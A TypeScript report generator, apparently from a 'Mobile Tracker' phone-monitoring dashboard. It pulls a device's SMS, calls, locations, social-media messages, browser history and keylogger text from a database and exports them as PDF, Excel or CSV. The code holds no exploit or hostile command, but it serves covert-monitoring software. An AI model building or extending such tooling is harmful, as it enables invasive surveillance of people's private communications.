import { createClient } from "@/lib/supabase/client"
import { format, parseISO, isValid } from "date-fns"
import jsPDF from "jspdf"
import autoTable from "jspdf-autotable"
import * as XLSX from "xlsx"

export type ReportType = "full" | "sms" | "calls" | "location" | "social" | "internet" | "keylogger" | "apps" | "alerts" | "custom"
export type ReportFormat = "pdf" | "excel" | "csv"

export interface ReportConfig {
  device_id: string
  device_name: string
  type: ReportType
  customTypes: string[]
  format: ReportFormat
  dateRange: { from: Date; to: Date }
  onProgress: (status: string, percentage: number) => void
}

const MODULES = [
  { id: "sms_messages", label: "SMS Messages", cols: ["timestamp", "message_type", "sender_number", "receiver_number", "message_body"] },
  { id: "call_logs", label: "Call Logs", cols: ["timestamp", "call_type", "phone_number", "contact_name", "duration"] },
  { id: "locations", label: "Locations", cols: ["timestamp", "latitude", "longitude", "accuracy", "address"] },
  { id: "social_messages", label: "Social Media", cols: ["timestamp", "platform", "direction", "sender_name", "body"] },
  { id: "browser_history", label: "Browser History", cols: ["timestamp", "title", "url", "browser", "visit_count"] },
  { id: "keylog_entries", label: "Keylogger", cols: ["timestamp", "app_name", "typed_text"] },
  { id: "installed_apps", label: "Installed Apps", cols: ["app_name", "package_name", "version", "is_system_app", "is_blocked"] },
  { id: "alerts", label: "Security Alerts", cols: ["timestamp", "severity", "alert_type", "title", "description"] },
]

export async function generateReport(config: ReportConfig): Promise<{ url: string, filename: string, size: number }> {
  const { device_id, device_name, type, customTypes, format: fileFormat, dateRange, onProgress } = config
  
  let selectedModules = []
  if (type === "full") selectedModules = MODULES
  else if (type === "custom") selectedModules = MODULES.filter(m => customTypes.includes(m.id))
  else selectedModules = MODULES.filter(m => m.id.startsWith(type) || m.label.toLowerCase().includes(type.replace("report", "").trim()))

  if (selectedModules.length === 0) throw new Error("No data modules selected for report.")

  const supabase = createClient()
  const dataset: Record<string, any[]> = {}

  let totalModules = selectedModules.length
  let progressStep = 0

  // ── 1. Fetch Data ──
  for (const mod of selectedModules) {
    onProgress(`Fetching ${mod.label}...`, Math.floor((progressStep / totalModules) * 40))
    let hasMore = true
    let page = 0
    const PAGE_SIZE = 2000
    const allRows: any[] = []

    while (hasMore) {
      // Installed apps doesn't use timestamp filter strictly, others do
      let query = supabase.from(mod.id).select(mod.cols.join(","))
        .eq("device_id", device_id)
        .range(page * PAGE_SIZE, (page + 1) * PAGE_SIZE - 1)

      if (mod.cols.includes("timestamp")) {
        query = query
          .gte("timestamp", dateRange.from.toISOString())
          .lte("timestamp", new Date(dateRange.to.getTime() + 86400000).toISOString())
          .order("timestamp", { ascending: false })
      }

      const { data, error } = await query
      if (error || !data || data.length === 0) {
        hasMore = false
      } else {
        allRows.push(...data)
        if (data.length < PAGE_SIZE) hasMore = false
        else page++
      }
    }
    
    // Format nested objects or dates
    dataset[mod.id] = allRows.map((row: any) => {
      const cleanRow: any = {}
      for (const k of mod.cols) {
        let val = row[k]
        if (k === "timestamp" && val && isValid(parseISO(val))) {
          val = format(parseISO(val), "yyyy-MM-dd HH:mm:ss")
        }
        if (typeof val === "boolean") val = val ? "Yes" : "No"
        if (typeof val === "object" && val !== null) val = JSON.stringify(val)
        cleanRow[k.replace(/_/g, " ").toUpperCase()] = val || ""
      }
      return cleanRow
    })

    progressStep++
  }

  // ── 2. Build Document ──
  onProgress("Formatting Document...", 50)

  const timestampStr = format(new Date(), "yyyyMMdd_HHmmss")
  const dateStr = `${format(dateRange.from, "MMM d, yyyy")} - ${format(dateRange.to, "MMM d, yyyy")}`
  const filename = `TrackerReport_${device_name.replace(/\s+/g, "_")}_${timestampStr}`

  let blob: Blob

  // ── FORMAT: EXCEL & CSV ──
  if (fileFormat === "excel" || fileFormat === "csv") {
    onProgress("Generating Spreadsheet...", 70)
    const wb = XLSX.utils.book_new()
    
    // Summary Sheet
    const summaryData = [
      { Parameter: "Device Name", Value: device_name },
      { Parameter: "Report Type", Value: type.toUpperCase() },
      { Parameter: "Date Range", Value: dateStr },
      { Parameter: "Generated At", Value: format(new Date(), "yyyy-MM-dd HH:mm:ss") },
      {},
      { Parameter: "Module", Value: "Rows Extracted" }
    ]
    selectedModules.forEach(mod => {
      summaryData.push({ Parameter: mod.label, Value: dataset[mod.id].length.toString() })
    })

    const summaryWs = XLSX.utils.json_to_sheet(summaryData)
    XLSX.utils.book_append_sheet(wb, summaryWs, "Summary")

    // Data Sheets
    selectedModules.forEach((mod, i) => {
      onProgress(`Formatting ${mod.label}...`, 70 + Math.floor((i / selectedModules.length) * 20))
      const sheetName = mod.label.replace(/[^a-zA-Z0-9]/g, "").substring(0, 31)
      let dataForSheet = dataset[mod.id]
      if (dataForSheet.length === 0) dataForSheet = [{ "NO DATA": "No records found in this date range." }]
      const ws = XLSX.utils.json_to_sheet(dataForSheet)
      XLSX.utils.book_append_sheet(wb, ws, sheetName)
    })

    if (fileFormat === "csv") {
      // For CSV, we can only save one sheet easily, so we merge all data or just pick the first module 
      // User said "single CSV file with selected data", so if multiple, we'll join them.
      let fullCsvData: any[] = []
      selectedModules.forEach(mod => {
        if (dataset[mod.id].length > 0) fullCsvData.push(...dataset[mod.id])
      })
      if (fullCsvData.length === 0) fullCsvData = [{ "NO DATA": "No records found." }]
      const csvWs = XLSX.utils.json_to_sheet(fullCsvData)
      const csvOutput = XLSX.utils.sheet_to_csv(csvWs)
      blob = new Blob([csvOutput], { type: "text/csv;charset=utf-8;" })
    } else {
      const excelBuffer = XLSX.write(wb, { bookType: "xlsx", type: "array" })
      blob = new Blob([excelBuffer], { type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" })
    }
  } 
  
  // ── FORMAT: PDF ──
  else if (fileFormat === "pdf") {
    onProgress("Generating PDF...", 70)
    const doc = new jsPDF("l", "pt", "a4")
    const pageWidth = doc.internal.pageSize.getWidth()
    const pageHeight = doc.internal.pageSize.getHeight()

    // Title Page
    doc.setFillColor(79, 70, 229) // Indigo 600
    doc.rect(0, 0, pageWidth, 120, "F")
    
    doc.setTextColor(255, 255, 255)
    doc.setFontSize(28)
    doc.setFont("helvetica", "bold")
    doc.text("Mobile Tracker Activity Report", 40, 60)
    
    doc.setFontSize(14)
    doc.setFont("helvetica", "normal")
    doc.text(`Device: ${device_name}`, 40, 90)

    doc.setTextColor(0, 0, 0)
    doc.setFontSize(12)
    doc.text(`Report Period: ${dateStr}`, 40, 160)
    doc.text(`Generated On: ${format(new Date(), "MMMM d, yyyy 'at' h:mm a")}`, 40, 180)
    doc.text(`Included Modules: ${selectedModules.map(m => m.label).join(", ")}`, 40, 200)

    // Module Tables
    selectedModules.forEach((mod, i) => {
      onProgress(`Processing ${mod.label}...`, 70 + Math.floor((i / selectedModules.length) * 20))
      doc.addPage()
      
      doc.setFontSize(18)
      doc.setFont("helvetica", "bold")
      doc.setTextColor(79, 70, 229)
      doc.text(mod.label, 40, 40)
      
      doc.setFontSize(10)
      doc.setFont("helvetica", "normal")
      doc.setTextColor(100, 100, 100)
      doc.text(`Total Records: ${dataset[mod.id].length}`, 40, 60)

      if (dataset[mod.id].length > 0) {
        const head = [Object.keys(dataset[mod.id][0])]
        const body = dataset[mod.id].map(row => Object.values(row))
        
        autoTable(doc, {
          startY: 80,
          head,
          body: body as any,
          theme: "striped",
          headStyles: { fillColor: [79, 70, 229], textColor: [255, 255, 255] },
          styles: { fontSize: 8, cellPadding: 3, overflow: "linebreak" },
          margin: { top: 40, bottom: 40, left: 40, right: 40 },
          didDrawPage: (data) => {
            doc.setFontSize(8)
            doc.text(`Page ${(doc as any).internal.getNumberOfPages()}`, pageWidth - 60, pageHeight - 20)
          }
        })
      } else {
        doc.setFontSize(12)
        doc.setTextColor(150, 150, 150)
        doc.text("No data available for this period.", 40, 100)
      }
    })

    const pdfBuffer = doc.output("arraybuffer")
    blob = new Blob([pdfBuffer], { type: "application/pdf" })
  } else {
    throw new Error("Invalid format selected")
  }

  onProgress("Finalizing download...", 100)
  
  const ext = fileFormat === "excel" ? "xlsx" : fileFormat
  const fullFilename = `${filename}.${ext}`
  const fileUrl = URL.createObjectURL(blob)

  return { url: fileUrl, filename: fullFilename, size: blob.size }
}
